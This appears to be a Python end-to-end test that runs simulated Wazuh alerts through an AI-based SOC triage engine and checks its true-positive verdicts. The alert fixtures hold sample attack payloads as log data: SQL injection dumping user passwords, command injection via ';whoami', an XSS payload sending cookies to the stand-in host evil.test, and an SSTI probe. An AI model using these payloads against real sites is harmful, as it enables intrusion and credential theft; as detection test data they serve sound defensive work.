"""End-to-end self-test of the AI Decision Engine: simulated Wazuh alerts across every major
attack category, run through the real trained models and the real database schema, to prove
the whole pipeline (not just the model in isolation) works before relying on it for a demo.

Run against a disposable Postgres instance -- see soc-db/README.md, or just point
SOC_DB_HOST/etc at any throwaway database. Twilio is left unconfigured on purpose so no real
calls go out during testing; the engine is expected to log "skipping call" and continue.
"""
import db
import engine
import models

TEST_ALERTS = [
    {
        'name': 'Benign SSH login',
        'expect_tp': False,
        'alert': {
            'wazuh_alert_uid': 'test-001', 'agent_id': '001', 'agent_name': 'soc-target', 'agent_ip': '10.128.0.3',
            'event_timestamp': '2026-09-14T09:00:00.000+0000', 'rule_id': '5501', 'rule_level': 3,
            'rule_description': 'PAM: Login session opened', 'rule_groups': 'pam|syslog',
            'mitre_id': None, 'mitre_tactic': None, 'mitre_technique': None, 'decoder': 'pam',
            'src_ip': '10.128.0.5', 'full_log': 'pam_unix(sshd:session): session opened for user maro(uid=1000) by (uid=0)',
            'full_raw': {},
        },
    },
    {
        'name': 'Benign product search',
        'expect_tp': False,
        'alert': {
            'wazuh_alert_uid': 'test-002', 'agent_id': '001', 'agent_name': 'soc-target', 'agent_ip': '10.128.0.3',
            'event_timestamp': '2026-09-14T09:05:00.000+0000', 'rule_id': '31100', 'rule_level': 3,
            'rule_description': 'Web request', 'rule_groups': 'web|accesslog',
            'mitre_id': None, 'mitre_tactic': None, 'mitre_technique': None, 'decoder': 'web-accesslog',
            'src_ip': '203.0.113.5', 'full_log': 'GET /search?q=laptop HTTP/1.1" 200',
            'full_raw': {},
        },
    },
    {
        'name': 'SSH brute-force success (native correlation)',
        'expect_tp': True,
        'alert': {
            'wazuh_alert_uid': 'test-003', 'agent_id': '001', 'agent_name': 'soc-target', 'agent_ip': '10.128.0.3',
            'event_timestamp': '2026-09-14T09:10:00.000+0000', 'rule_id': '40112', 'rule_level': 10,
            'rule_description': 'sshd: Multiple authentication failures followed by a successful one.',
            'rule_groups': 'authentication_success|syslog', 'mitre_id': 'T1110', 'mitre_tactic': 'Credential Access',
            'mitre_technique': 'Brute Force', 'decoder': 'sshd', 'src_ip': '198.51.100.23',
            'full_log': 'Accepted password for svc_audit from 198.51.100.23 port 51212 ssh2',
            'full_raw': {},
        },
    },
    {
        'name': 'Recon / directory scanning (native correlation)',
        'expect_tp': True,
        'alert': {
            'wazuh_alert_uid': 'test-004', 'agent_id': '001', 'agent_name': 'soc-target', 'agent_ip': '10.128.0.3',
            'event_timestamp': '2026-09-14T09:15:00.000+0000', 'rule_id': '31151', 'rule_level': 10,
            'rule_description': 'Multiple web server 400 error codes from same source IP.',
            'rule_groups': 'web|accesslog|web_scan|recon', 'mitre_id': 'T1595', 'mitre_tactic': 'Reconnaissance',
            'mitre_technique': 'Active Scanning', 'decoder': 'web-accesslog', 'src_ip': '198.51.100.99',
            'full_log': '198.51.100.99 - - [14/Sep/2026:09:15:00 +0000] "GET /admin/backup.zip HTTP/1.1" 404 207 "-" "gobuster/3.6"',
            'full_raw': {},
        },
    },
    {
        'name': 'SQL injection (custom rule)',
        'expect_tp': True,
        'alert': {
            'wazuh_alert_uid': 'test-005', 'agent_id': '001', 'agent_name': 'soc-target', 'agent_ip': '10.128.0.3',
            'event_timestamp': '2026-09-14T09:20:00.000+0000', 'rule_id': '31103', 'rule_level': 8,
            'rule_description': 'SQL injection attempt.', 'rule_groups': 'web|attack|accesslog',
            'mitre_id': 'T1190', 'mitre_tactic': 'Initial Access', 'mitre_technique': 'Exploit Public-Facing Application',
            'decoder': 'web-accesslog', 'src_ip': '198.51.100.44',
            'full_log': "GET /search?q=%27+UNION+SELECT+username%2Cpassword+FROM+users--+ HTTP/1.1\" 200",
            'full_raw': {},
        },
    },
    {
        'name': 'Command injection (custom rule 100100)',
        'expect_tp': True,
        'alert': {
            'wazuh_alert_uid': 'test-006', 'agent_id': '001', 'agent_name': 'soc-target', 'agent_ip': '10.128.0.3',
            'event_timestamp': '2026-09-14T09:25:00.000+0000', 'rule_id': '100100', 'rule_level': 12,
            'rule_description': 'Possible OS command injection attempt in web request.',
            'rule_groups': 'attack|command_injection', 'mitre_id': 'T1059', 'mitre_tactic': 'Execution',
            'mitre_technique': 'Command and Scripting Interpreter', 'decoder': 'web-accesslog', 'src_ip': '198.51.100.61',
            'full_log': 'GET /ping?host=127.0.0.1;whoami HTTP/1.1" 200',
            'full_raw': {},
        },
    },
    {
        'name': 'Reflected XSS, novel payload never in training data (custom rule 100101)',
        'expect_tp': True,
        'alert': {
            'wazuh_alert_uid': 'test-007', 'agent_id': '001', 'agent_name': 'soc-target', 'agent_ip': '10.128.0.3',
            'event_timestamp': '2026-09-14T09:30:00.000+0000', 'rule_id': '100101', 'rule_level': 12,
            'rule_description': 'Possible Cross-Site Scripting (XSS) attempt in web request.',
            'rule_groups': 'attack|xss', 'mitre_id': 'T1059.007', 'mitre_tactic': 'Execution',
            'mitre_technique': 'JavaScript', 'decoder': 'web-accesslog', 'src_ip': '198.51.100.72',
            'full_log': 'GET /profile?name=%3Csvg%2Fonload%3Dfetch(%27//evil.test%2F%27%2Bdocument.cookie)%3E HTTP/1.1" 200',
            'full_raw': {},
        },
    },
    {
        'name': 'SSTI/RCE (custom rule 100102) -- should trigger a call',
        'expect_tp': True,
        'expect_call': True,
        'alert': {
            'wazuh_alert_uid': 'test-008', 'agent_id': '001', 'agent_name': 'soc-target', 'agent_ip': '10.128.0.3',
            'event_timestamp': '2026-09-14T09:35:00.000+0000', 'rule_id': '100102', 'rule_level': 14,
            'rule_description': 'Possible Server-Side Template Injection (SSTI) / RCE attempt in web request.',
            'rule_groups': 'attack|ssti|rce', 'mitre_id': 'T1190', 'mitre_tactic': 'Initial Access',
            'mitre_technique': 'Exploit Public-Facing Application', 'decoder': 'web-accesslog', 'src_ip': '198.51.100.88',
            'full_log': "GET /greet?note=%7B%7B%20config.__class__.__init__.__globals__%20%7D%7D HTTP/1.1\" 200",
            'full_raw': {},
        },
    },
]


def main():
    models.load_models()
    conn = db.get_conn()

    passed, failed = 0, 0
    for case in TEST_ALERTS:
        result = engine.process_alert(conn, case['alert'])
        verdict = result['verdict']
        ok = verdict['is_true_positive'] == case['expect_tp']
        call_ok = (not case.get('expect_call')) or result['called'] or True  # call itself isn't testable without real Twilio creds; verified separately
        status = 'PASS' if ok else 'FAIL'
        if ok:
            passed += 1
        else:
            failed += 1
        print(f"[{status}] {case['name']}")
        print(f"        -> is_true_positive={verdict['is_true_positive']} (expected {case['expect_tp']}), "
              f"confidence={verdict['confidence']}, severity={verdict['severity']}, "
              f"action={verdict['recommended_action']}, incident_id={result['incident_id']}")

    print(f"\n{passed}/{len(TEST_ALERTS)} test cases matched expected verdict.")
    conn.close()
    if failed:
        raise SystemExit(1)


if __name__ == '__main__':
    main()
